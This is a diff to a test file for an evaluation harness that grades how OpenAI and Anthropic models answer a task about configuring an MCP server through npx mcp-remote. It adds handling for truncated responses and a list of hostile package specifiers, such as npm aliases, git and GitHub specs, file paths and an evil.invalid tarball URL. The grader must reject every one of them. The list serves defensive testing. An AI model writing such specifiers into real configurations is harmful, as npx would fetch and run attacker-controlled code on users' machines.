@@ -71,7 +71,7 @@ const wsc = (action: any, over: any = {}) => ({ type: "web_search_call", id: `ws
 const msgO = (...content: any[]) => ({ type: "message", id: "msg_1", status: "completed", role: "assistant", content });
 const otext = (text: string, annotations?: any[]) => (annotations === undefined ? { type: "output_text", text } : { type: "output_text", text, annotations });
 const cite = (url: string) => ({ type: "url_citation", url, title: "t", start_index: 0, end_index: 1 });
-const resp = (output: any[], over: any = {}) => ({ id: "resp_1", object: "response", status: "completed", error: null, model: "gpt-5.5-2026-04-23", output, ...over });
+const resp = (output: any[], over: any = {}) => ({ id: "resp_1", object: "response", status: "completed", error: null, incomplete_details: null, model: "gpt-5.5-2026-04-23", output, ...over });
 // Anthropic Messages builders (docs/provider-shapes/anthropic-messages-web-tools.md)
 const turn = (content: any, stop_reason = "end_turn") => ({ id: "msg_1", type: "message", role: "assistant", model: "claude-opus-5-5", stop_reason, content });
 const an = (...turns: any[]) => ({ turns });
@@ -124,6 +124,9 @@ const realJudge = (provider: string, raw: any) => TARGETS.naturalTask.judge({ ob
     ["status missing", (() => { const r: any = structuredClone(OA_N1); delete r.status; return r; })()], ["error an object with status completed", resp(OA_N1.output, { error: { code: "x" } })], ["output missing", { status: "completed", error: null }], ["output a string", resp("x" as any)],
     ["the response 42", 42], ["the response null", null], ["the response an array", [OA_N1]],
   ] as const) expect(`A openai top: ${why} → refused (instrument other)`, refused(tracesOpenAI(raw as any)));
+  expect("A openai top: incomplete with incomplete_details.reason max_output_tokens → instrument budget, nothing read", (() => { const t = tracesOpenAI(resp(OA_N1.output, { status: "incomplete", incomplete_details: { reason: "max_output_tokens" } })); return t.instrument === "budget" && t.fetched.length === 0 && t.cited.length === 0 && t.text === ""; })());
+  expect("A openai top: incomplete for another reason (content_filter) or without details → instrument other", refused(tracesOpenAI(resp(OA_N1.output, { status: "incomplete", incomplete_details: { reason: "content_filter" } }))) && refused(tracesOpenAI(resp(OA_N1.output, { status: "incomplete" }))) && refused(tracesOpenAI(resp(OA_N1.output, { status: "incomplete", incomplete_details: { reason: 42 } }))));
+  expect("A openai top: an incomplete response whose items break the table is other, not budget (the table first)", refused(tracesOpenAI(resp([42 as any], { status: "incomplete", incomplete_details: { reason: "max_output_tokens" } }))));
   expect("A openai top: error absent is fine (documented nullable; a response may omit it)", (() => { const r: any = structuredClone(OA_N1); delete r.error; return tracesOpenAI(r).shape_ok; })());
   // N3: every required field of a known type
   for (const [why, item] of [
@@ -192,6 +195,14 @@ const realJudge = (provider: string, raw: any) => TARGETS.naturalTask.judge({ ob
     ["P2 an option that does not run other code before the script (--inspect)", e("node", ["--inspect", PATH], ENV), "official"],
     ["P3 npx.cmd, --yes, mcp-remote@version", e("C:\\nodejs\\npx.cmd", ["--yes", "mcp-remote@0.1.0", "https://h/mcp", ...H]), "official"],
     ["P3 without -y", e("npx", ["mcp-remote", "https://h/mcp", ...H]), "official"],
+    ["P3 mcp-remote@latest (a plain tag)", e("npx", ["-y", "mcp-remote@latest", "https://h/mcp", ...H]), "official"],
+    ["P3 mcp-remote@0.1.16-beta.1", e("npx", ["-y", "mcp-remote@0.1.16-beta.1", "https://h/mcp", ...H]), "official"],
+    ["mcp-remote@npm:evil-pkg (an npm alias runs another package; Claude's review of da628ca)", e("npx", ["-y", "mcp-remote@npm:evil-pkg", "https://h/mcp", ...H]), "unclear"],
+    ["mcp-remote@git+https://… (git spec)", e("npx", ["-y", "mcp-remote@git+https://github.com/evil/x.git", "https://h/mcp", ...H]), "unclear"],
+    ["mcp-remote@github:evil/x", e("npx", ["-y", "mcp-remote@github:evil/x", "https://h/mcp", ...H]), "unclear"],
+    ["mcp-remote@file:../x", e("npx", ["-y", "mcp-remote@file:../x", "https://h/mcp", ...H]), "unclear"],
+    ["mcp-remote@1.0.0@evil (a second @)", e("npx", ["-y", "mcp-remote@1.0.0@evil", "https://h/mcp", ...H]), "unclear"],
+    ["mcp-remote@ (an empty version)", e("npx", ["-y", "mcp-remote@", "https://h/mcp", ...H]), "unclear"],
     ["Codex N1: echo <official path>", e("echo", [PATH], ENV), "unclear"],
     ["Codex N1: node <other script> <official path>", e("node", ["/test/unrelated.js", PATH], ENV), "unclear"],
     ["Codex N1: node -e <code> <official path>", e("node", ["-e", "console.log(1)", PATH], ENV), "unclear"],
@@ -338,6 +349,7 @@ const schema = loadReadingSchema();
 
 // ── Part E: callers, removed parts, the real taskpack ────────────────────
 {
+  expect("E output limits leave room for reasoning and search: openai max_output_tokens 16000, anthropic max_tokens 8000 (defaults and the M-006 taskpack)", CONFIG_DEFAULTS.openai.max_output_tokens === 16000 && CONFIG_DEFAULTS.anthropic.max_tokens === 8000 && (() => { const p = JSON.parse(readFileSync(join(ROOT, "exec-harness", "taskpacks", "agileworks", "agileworks-m006-natural-task.v1.json"), "utf-8")); return p.marker.configs[0].options.max_output_tokens === 16000 && p.marker.configs[1].options.max_tokens === 8000; })());
   expect("E two configurations only: openai (gpt-5.5 dated, JP, web_search) and anthropic (opus-5-5, base tool versions)", sameList(Object.keys(CONFIG_DEFAULTS), ["openai", "anthropic"]) && CONFIG_DEFAULTS.openai.model === "gpt-5.5-2026-04-23" && CONFIG_DEFAULTS.openai.user_location.country === "JP" && CONFIG_DEFAULTS.anthropic.model === "claude-opus-5-5" && CONFIG_DEFAULTS.anthropic.tools[0] === "web_search_20250305" && CONFIG_DEFAULTS.anthropic.tools[1] === "web_fetch_20250910");
   const REMOVED = ["tracesPerplexity", "tracesClaudeCode", "perplexityCitedIds", "claudeCodeIsolation", "claudeCodeEnv", "claudeCodeVersion", "collectWorkFiles", "runClaudeCode", "CLAUDE_CODE_ARGS", "CLAUDE_CODE_ENV_INHERIT", "CLAUDE_CODE_ENV_SET", "childEnvNames", "child_env_names"];
   const srcs = ["natural-task.mjs", "natural-task-rules.mjs", "marker-targets.mjs", "marker-generic.mjs"].map((f) => readFileSync(join(LIB, f), "utf-8")).join("\n") + readFileSync(join(ROOT, "exec-harness", "run-marker.mjs"), "utf-8") + readFileSync(join(ROOT, "exec-harness", "render-reading-sheet.mjs"), "utf-8");
@@ -353,7 +365,7 @@ const schema = loadReadingSchema();
     const t1 = [stu("f", "web_fetch", { url: REPO }), txt("x")];
     queue = [turn(t1, "pause_turn"), turn([wfr("f", { type: "web_fetch_result", url: REPO }), txt(fence(P2))])];
     const a = await runNaturalTask({ provider: "anthropic" }, "task", {});
-    expect("E anthropic caller: a paused turn is re-sent unchanged; raw = every turn as received", a.raw.turns.length === 2 && bodies.length === 2 && bodies[1].messages.length === 2 && bodies[1].messages[1].role === "assistant" && eq(bodies[1].messages[1].content, t1) && tag(await realJudge("anthropic", a.raw)) === "done/null/pass");
+    expect("E anthropic caller: a paused turn is re-sent unchanged; raw = every turn as received; max_tokens 8000 sent", bodies[0].max_tokens === 8000 && a.raw.turns.length === 2 && bodies.length === 2 && bodies[1].messages.length === 2 && bodies[1].messages[1].role === "assistant" && eq(bodies[1].messages[1].content, t1) && tag(await realJudge("anthropic", a.raw)) === "done/null/pass");
     queue = [{ content: 42, stop_reason: "pause_turn" }, turn([])]; bodies.length = 0;
     const b = await runNaturalTask({ provider: "anthropic" }, "task", {});
     expect("E anthropic caller: a paused turn whose content is not an array is not continued; the rules refuse it", bodies.length === 1 && b.raw.turns.length === 1 && tag(await realJudge("anthropic", b.raw)) === "discover/discover/inst:other");
@@ -362,7 +374,10 @@ const schema = loadReadingSchema();
     expect(`E anthropic caller: at most ${MAX_CONTINUATIONS} continuations; still paused → instrument budget`, bodies.length === MAX_CONTINUATIONS + 1 && c.raw.turns.length === MAX_CONTINUATIONS + 1 && tag(await realJudge("anthropic", c.raw)) === "discover/discover/inst:budget");
     queue = [resp(OA_N1.output, { status: "failed", error: { code: "server_error", message: "ERROR_CANARY" } })]; bodies.length = 0;
     const d = await runNaturalTask({ provider: "openai" }, "task", {});
-    expect("E openai caller: the body as received; a failed response is refused by the rules (instrument other)", d.raw.status === "failed" && tag(await realJudge("openai", d.raw)) === "discover/discover/inst:other" && bodies[0].tool_choice === "required" && bodies[0].tools[0].type === "web_search" && sameList(bodies[0].include, ["web_search_call.action.sources"]));
+    queue = [resp(OA_N1.output, { status: "incomplete", incomplete_details: { reason: "max_output_tokens" } })];
+    const d2 = await runNaturalTask({ provider: "openai" }, "task", {});
+    expect("E openai caller: an incomplete response cut by max_output_tokens is instrument budget end to end", tag(await realJudge("openai", d2.raw)) === "discover/discover/inst:budget");
+    expect("E openai caller: the body as received; a failed response is refused by the rules (instrument other)", d.raw.status === "failed" && tag(await realJudge("openai", d.raw)) === "discover/discover/inst:other" && bodies[0].max_output_tokens === 16000 && bodies[0].tool_choice === "required" && bodies[0].tools[0].type === "web_search" && sameList(bodies[0].include, ["web_search_call.action.sources"]));
   } finally { globalThis.fetch = realFetch; await new Promise<void>((r) => server.close(() => r())); }
   expect("E public model grammar is the closed one", String(PUBLIC_MODEL) === String(/^[a-z0-9][a-z0-9.\-]{0,63}$/) && String(PUBLIC_CLI_VERSION) === String(/^[0-9]{1,4}\.[0-9]{1,4}\.[0-9]{1,6}$/));
   expect("E publicModel: in the grammar → reported; outside → configured, the reported withheld", eq(publicModel("gpt-5.5-2026-04-23", "openai"), { model: "gpt-5.5-2026-04-23", withheld: null }) && eq(publicModel("https://x/y", "claude-opus-5-5"), { model: "claude-opus-5-5", withheld: "https://x/y" }) && publicModel("Opus", "x").model === "x");
@@ -427,6 +442,7 @@ const schema = loadReadingSchema();
     for (const s of ["failed", "incomplete", "in_progress", "cancelled", "queued"]) list.push({ why: `status ${s}`, raw: { ...sample, status: s } });
     list.push({ why: "status failed + error object", raw: { ...sample, status: "failed", error: { code: "server_error", message: "x" } } });
     list.push({ why: "error object with status completed", raw: { ...sample, error: { code: "x", message: "y" } } });
+    list.push({ why: "status incomplete, reason content_filter", raw: { ...sample, status: "incomplete", incomplete_details: { reason: "content_filter" } } });
     await run("openai", label, list);
   }
   const anRoot = { t: "object", fields: { turns: { t: "array", items: SHAPES.anthropic.turn } } };
@@ -477,7 +493,15 @@ const schema = loadReadingSchema();
     artCounts[form] = list.length;
     for (const m of list) { const v = await realJudge("openai", wrap(m.art)); let exclusive = true; try { assertExclusive({ pass: v.pass, false_completion: v.falseCompletion, undetermined: v.undetermined, instrument_error: v.instrument }); } catch { exclusive = false; } if (v.pass || v.reached === "done" || !exclusive) artFailed.push(`${form}: ${m.why} → ${tag(v)}`); }
   }
-  console.log(`      artifact mutations: P2 ${artCounts.P2}, P3 ${artCounts.P3} = ${artCounts.P2 + artCounts.P3}`);
+  // the version position of P3 (Claude's review of da628ca): npm alias / git / github: / file: / URL / a second @ / an empty version
+  const VERSIONS = ["npm:evil-pkg", "npm:mcp-remote@0.1.16", "git+https://github.com/evil/x.git", "git://github.com/evil/x.git", "github:evil/mcp-remote", "evil/mcp-remote", "file:../evil", "https://evil.invalid/x.tgz", "1.0.0@evil", "@evil", "", "1.0.0#evil", "1.0.0/x", "latest:x", " 1.0.0", "-1.0.0", "1.0.0 ", "x\ny"];
+  const pkgAt = P3.mcpServers.AgileWorks.args.indexOf("mcp-remote");
+  const verFailed: string[] = [];
+  for (const ver of VERSIONS) { const v = await realJudge("openai", wrap(setAt(P3, ["mcpServers", "AgileWorks", "args", pkgAt], `mcp-remote@${ver}`))); if (v.pass || v.reached === "done" || !ok(v, "artifact_form_unclear")) verFailed.push(`${JSON.stringify(ver)} → ${tag(v)}`); }
+  for (const ver of ["latest", "0.1.16", "0.1.16-beta.1"]) { const v = await realJudge("openai", wrap(setAt(P3, ["mcpServers", "AgileWorks", "args", pkgAt], `mcp-remote@${ver}`))); if (!v.pass) verFailed.push(`control ${ver} → ${tag(v)}`); }
+  artCounts.P3_version = VERSIONS.length;
+  console.log(`      artifact mutations: P2 ${artCounts.P2}, P3 ${artCounts.P3}, P3 version position ${artCounts.P3_version} = ${artCounts.P2 + artCounts.P3 + artCounts.P3_version}`);
+  expect(`M the version position of P3: every alias / git / github: / file: / URL / odd version (${VERSIONS.length}) is unclear, never done; a plain tag or semver stays official`, verFailed.length === 0, verFailed.join(" | "));
   expect(`M no broken artifact (${artCounts.P2 + artCounts.P3}) is done`, artFailed.length === 0, artFailed.slice(0, 12).join(" | "));
 }
 
